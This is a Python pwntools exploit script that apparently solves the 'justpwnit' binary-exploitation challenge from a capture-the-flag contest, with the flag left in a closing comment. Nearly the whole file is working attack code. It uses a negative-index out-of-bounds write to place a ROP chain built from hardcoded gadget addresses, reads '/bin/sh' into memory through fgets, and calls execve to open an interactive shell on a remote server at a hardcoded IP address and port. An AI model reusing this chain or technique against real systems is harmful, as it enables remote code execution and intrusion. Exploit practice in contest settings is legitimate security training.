from pwn import *
import time


addr_pop_rdi = 0x0000000000401b0d  # : pop rdi ; ret
addr_pop_rsi = 0x00000000004019a3  # : pop rsi ; ret
addr_pop_rdx = 0x0000000000403d23  # : pop rdx ; ret
addr_pop_rax = 0x0000000000401001  # : pop rax ; ret

addr_syscall = 0x00000000004013e9  # : syscall


addr_data = 0x000000000040b000
addr_pivot = addr_data + 0x1000
addr_binsh = addr_data + 0x500


def main():
    # context.log_level = 'DEBUG'
    binpath = './justpwnit'
    elf = ELF(binpath)

    gdbscript = '''
    # b main
    gef
    # b fgets
    # b set_element
    # ignore 2 3
    # b justpwnit
    # leave @ justpwnit
    # b *0x40123b
    c
    '''
    # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
    # io = process(binpath)
    io = remote('168.119.108.148', 11010)

    for i in range(3):
        io.sendlineafter(b'Index: ', b'%d' % i)
        io.sendlineafter(b'Data: ', chr(ord(b'A') + i).encode())

    # io.sendlineafter(b'Index: ', b'0')
    # io.sendlineafter(b'Data: ', b'/bin/sh\x00')

    rop = b''
    rop += p64(0xdeadbeef)
    # fgets(addr_binsh, 0x100, stdin)
    rop += p64(addr_pop_rdi)
    rop += p64(addr_binsh)
    rop += p64(addr_pop_rsi)
    rop += p64(0x100)
    rop += p64(addr_pop_rdx)
    # rop += p64(elf.symbols['stdin'])
    rop += p64(0x40c040)  # stdin
    rop += p64(elf.symbols['fgets'])
    # execve(addr_binsh, NULL, NULL)
    rop += p64(addr_pop_rdi)
    rop += p64(addr_binsh)
    rop += p64(addr_pop_rsi)
    rop += p64(0)
    # rop += p64(addr_pop_rdx)
    # rop += p64(0)
    rop += p64(addr_pop_rax)
    rop += p64(59)
    rop += p64(addr_syscall)

    print(hex(len(rop)))
    assert(len(rop) <= 0x80)

    io.sendlineafter(b'Index: ', b'-2')
    io.sendlineafter(b'Data: ', rop)

    time.sleep(0.1)

    io.sendline(b'/bin/sh\x00')
    # io.sendline(b'hoge')

    io.interactive()

if __name__ == '__main__':
    main()
    # ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
